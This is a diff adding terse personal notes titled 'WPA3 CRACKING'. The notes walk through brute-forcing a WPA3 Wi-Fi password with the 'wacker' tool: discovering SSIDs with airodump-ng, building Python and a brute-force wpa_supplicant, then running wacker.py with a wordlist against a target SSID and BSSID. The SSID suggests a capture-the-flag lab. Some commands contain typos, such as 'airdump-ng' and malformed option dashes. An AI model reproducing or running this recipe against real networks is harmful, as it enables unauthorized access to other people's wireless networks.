@@ -1,0 +1,24 @@
+WPA3 CRACKING: https://kalilinuxtutorials.com/wacker/
+discover wpa3 ssid
+airdump-ng wlan0
+
+install python
+# apt-get install build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev -y
+# tar xf Python-3.7.0.tar.xz
+# cd Python-3.7.0
+# ./configure
+# make -j4
+# make altinstall
+
+building wpa_supplicant
+# apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev
+# cd wpa_supplicant-2.8/wpa_supplicant/
+# cp defconfig_brute_force .config
+# make -j4
+# ls -al wpa_supplicant
+-rwxr-xr-x 1 root root 13541416 May 31 16:30 wpa_supplicant
+
+Running wacker
+#./wacker.py –wordlist cyberpunk.words –-ssid WCTF_18 –-bssid 02:00:00:00:00:00 –interface wlan2 –freq 2412
+
+This command gives the password
